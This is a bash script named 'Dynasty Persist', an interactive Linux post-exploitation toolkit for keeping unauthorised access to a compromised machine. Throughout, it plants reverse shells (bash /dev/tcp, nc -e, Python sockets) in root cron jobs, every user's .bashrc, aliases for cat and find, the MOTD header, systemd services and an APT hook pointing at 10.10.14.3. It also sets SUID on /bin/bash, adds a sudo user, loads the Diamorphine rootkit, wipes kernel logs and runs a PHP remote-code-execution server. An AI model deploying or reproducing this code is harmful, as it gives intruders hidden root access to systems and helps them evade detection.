#!/bin/bash


################################################ 
#                                              #    
#        Title: Dynasty Persist                #  
#        Author: Trevohack                     # 
#        Date: 24.12.2023                      #  
#        Version: 1.3                          # 
#                                              # 
################################################ 


if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <ip> <port>"
    exit 1
fi

ip="$1"
port="$2"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
RESET='\033[0m'


newUser() {
    echo -e "\033[0;32m[+] - New User Config " && echo -e "\n"
    echo -e "\033[0;32m[+] - Enter a name for the new user: "
    read Newuser 
    adduser $Newuser 
    usermod -aG sudo $Newuser 
    chmod u+s /bin/bash
}


sshConfig() {
    for user_dir in /home/*; do
        if [[ -d "$user_dir" && ! -L "$user_dir" && "$(basename "$user_dir")" != "lost+found" ]]; then
        username=$(basename "$user_dir")
            if [[ ! -f "$user_dir/.ssh/id_rsa" && ! -f "$user_dir/.ssh/id_rsa.pub" ]]; then
                echo "Generating SSH keys for user: $username"
                sudo -u "$username" ssh-keygen -t rsa -b 4096 -N "" -f "$user_dir/.ssh/id_rsa"
            else
                echo "SSH keys already exist for user: $username"
            fi
        fi
    done 
    echo -e "\033[0;32m[+] - SSH key generation complete."

}


ServiceOnSystemd() {
    echo -e "\033[0;32m[+] - Systemd Root Service setting up ...\n"
    echo "Enter the full path of the script: "
    read scrip
    echo "Enter the command to run: "
    read exec 
    if [ -z "$script" ]; then
        script="exec.sh"
    fi
    if [ -z "$exec" ]; then
        exec="sudo bash"
    fi
    local CONFIG_CONTENT="[Unit]
Description=Dynasty Persist

[Service]
ExecStart=${exec} ${script}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target"

    echo "$CONFIG_CONTENT" | sudo tee /etc/systemd/system/rshell.service > /dev/null 

    systemctl daemon-reload
    systemctl enable rshell.service 
    systemctl start rshell.service 

    echo -e "\033[0;32m[+] - Systemd Root Level Service successfully configued!"
}

ModServiceOnSystemd() {
    echo -e "\033[0;32m[+] - Modify Systemd Service for Persistence"
    read -p "Enter the location of the service: " loca
    sed -i "/^ExecStart=/c\ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" "$loca"
    if grep -q "ExecStartPre" "$service_file"; then
        sed -i "s/^ExecStartPre=.*/ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" "$loca"
        echo "ExecStartPre present! ExecStartPre was modified!\n\n"
    else
        echo "No ExecStartPre present! ExecStart was modified!\n\n"
    fi
    echo -e "\033[0;32m[+] - Modified Root level setup successfully!"
}

cronjobs() {
    echo -e "\033[0;32m[+] - Setting up cronjobs for persistence ... " && echo -e "\n"
    comandx="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
    command2="/usr/bin/python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$ip\\\",$port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
    command3="/usr/bin/python3 -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$ip\\\",$port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""    echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
    echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
    echo "* * * * * root $command2" | sudo tee -a /etc/crontab 
    echo "* * * * * root $command3" | sudo tee -a /etc/crontab 
    echo -e "\033[0;32m[+] - Cronjobs successfully started."
}

bashrc() {
    echo -e "\033[0;32m[+] - Configuring ~/.bashrc for persistence ... " && echo -e "\n"
    command0="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
    command="nc -e /bin/sh $ip $port"
    for user in /home/*; do
        if [ -d "$user" ]; then
          echo "$command" >> "$user/.bashrc"
          echo "$command0" >> "$user/.bashrc"
          echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "$user/.bashrc" 
          echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "$user/.bashrc"
        fi
    echo "$command0" >> "/root/.bashrc"
    echo "$command" >> "/root/.bashrc"
    echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "/root/.bashrc" 
    echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "/root/.bashrc" 
    done
    echo -e "\033[0;32m[+] - Bashrc persistence added!"
}

configDiamorphine() {
    echo -e "\033[0;32m[+] - Rootkit Configuration"
    mkdir -p /var/tmp/.memory
    git clone https://github.com/m0nad/Diamorphine /var/tmp/.memory
    mv /var/tmp/.memory/diamorphine.c /var/tmp/.memory/root.c 
    mv /var/tmp/.memory/diamorphine.h /var/tmp/.memory/root.h
    sed -i 's/diamorphine_secret/dynasty/g' /var/tmp/.memory/root.h
    sed -i 's/diamorphine/dynasty/g' /var/tmp/.memory/root.h
    make -C /var/tmp/.memory
    sed -i 's/diamorphine.h/root.h/g' /var/tmp/.memory/root.c
    sed -i 's/diamorphine_init/root_init/g' /var/tmp/.memory/root.c 
    sed -i 's/diamorphine_cleanup/root_clean/g' /var/tmp/.memory/root.c
    sed -i 's/diamorphine.o/root.o/g' /var/tmp/.memory/Makefile
    insmod /var/tmp/.memory/root.ko
    make clean -C /var/tmp/.memory
    rm -rf /var/tmp/.memory
    dmesg -C 
    echo "Nothing to see here ... " > /var/log/kern.log
    echo -e "\033[0;32m[+] - Rootkit configured successfully"
}

LDPreloadPrivesc() {
    echo -e "\033[0;32m[+] - LD_PRELOAD Privilege Escalation\n"
    chmod +x preload.sh
    ./preload.sh
    echo -e "\033[0;32m[+] - Configured!\n"
}

rcePersistence() {
    echo -e "\033[0;32m[+] - RCE Persistence\n"
    PORT=9056 
    mkdir /var/www/html/dynasty_rce 
    cp rce.php /var/www/dynasty_rce/rce.php 
    cd /var/www/html/dynasty_rce 
    nohup php -S 0.0.0.0:$PORT > /dev/null 2>&1 & 
    echo -e "\033[0;32m[+] - RCE on $PORT\n" 
}

MessageOfTheDay() {
    echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence\n"
    echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/update-motd.d/00-header 
    echo "nc -e /bin/sh $ip $port" >> /etc/update-motd.d/00-header 
    echo "$python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
    echo -e "\033[0;32m[+] - Success!"
}

backdoorApt() {
    echo -e "\033[0;32m[+] - Backdoor APT\n"
    revshell="sh -i >& /dev/tcp/10.10.14.3/9999 0>&1"
    echo 'APT::Update::Pre-Invoke {"nohup sh -i >& /dev/tcp/10.10.14.3/9999 0>&1 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor 
    echo -e "\033[0;32m[+] - APT is now spooky!\n"
}

help() {
    echo -e "\e[1m
        ──────────────────────────────────────────────────
            \e[96mD Y N A S T Y  - P E R S I S T\e[0m
        ──────────────────────────────────────────────────

        \e[93m1. [ Tested on Debian Systems ]\e[0m

        \e[93m1. Basrc Persistence:\e[0m
        Maintain persistence: When a user authenticates.

        \e[93m2. Cronjob Persistence:\e[0m
        Schedule tasks for persistence.

        \e[93m3. Custom User with Root:\e[0m
        Create a root privileged user account.

        \e[93m4. RCE Persistence:\e[0m
        Remote Code Execution capabilities through a web server.

        \e[93m5. Custom LKM/Rootkit:\e[0m
        Implement custom kernel modules or rootkits / Diamorphine.

        \e[93m6. SSH Key Generation:\e[0m
        Generate SSH keys for secure authentication for every user.

        \e[93m7. Systemd Service for Root:\e[0m
        Configure root-level service for persistence.

        \e[93m8. LD_PRELOAD Privilege Escalation:\e[0m
        Special Thanks to @MatheuzSec for this.

        \e[93m9. Backdooring Message Of The Day / Linux Header:\e[0m
        Backdoor the Linux header on 00-header on the update-motd framework

        \e[93m10. Modify A Systemd Service for Persistence:\e[0m
        Modify a present systemd service for a reverse shell / persistence 

        \e[93m10. Backdoor APT command:\e[0m
        Backdoors apt command, to pop up a shell 

        ───────────────────DYNASTY───────────────────\e[0m"


}

main() {
    echo -e "${CYAN}  _             _                   
        | \    ._   _.  _ _|_     |_) _  ._ _ o  _ _|_ 
        |_/ \/ | | (_| _>  |_ \/  |  (/_ | _> | _>  |_ 
            /                 /                        
            "
    text="Made by: @Trevohack | @opabravo | @matheuz"
    delay="0.1"

    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep "$delay"
    done
    echo

    echo -e " 
       1. SSH Key Generation          4. RCE Persistence 
       2. Cronjob Persistence         5. LKM/Rootkit
       3. Custom User with Root       6. Bashrc Persistence 
       7. Systemd Service for Root    8. LD_PRELOAD Privilege Escalaion Config
       9. Backdooring Message of the Day / Header 
       10. Modify An Existing Systemd Service 
       11. Backdoor APT
       
       help for more information! 
       ${RESET}
       "
       read -p "[-{DYNASTY-P3R1ST}-] " input
       if [ "$input" == "1" ]; then
           sshConfig
       elif [ "$input" == "2" ]; then
           cronjobs
       elif [ "$input" == "3" ]; then
           newUser
       elif [ "$input" == "4" ]; then
            rcePersistence
       elif [ "$input" == "5" ]; then
           configDiamorphine
       elif [ "$input" == "6" ]; then
           bashrc 
       elif [ "$input" == "7" ]; then
           ServiceOnSystemd 
       elif [ "$input" == "8" ]; then
           LDPreloadPrivesc 
       elif [ "$input" == "9" ]; then
           MessageOfTheDay
       elif  [ "$input" == "10" ]; then
           ModServiceOnSystemd 
        elif  [ "$input" == "11" ]; then
           backdoorApt
       elif [ "$input" == "help" ] || [ input == "h" ]; then
           help 
       else 
           echo -e "${RED}[ERROR] Invalid command"
        fi
}

clear  
main
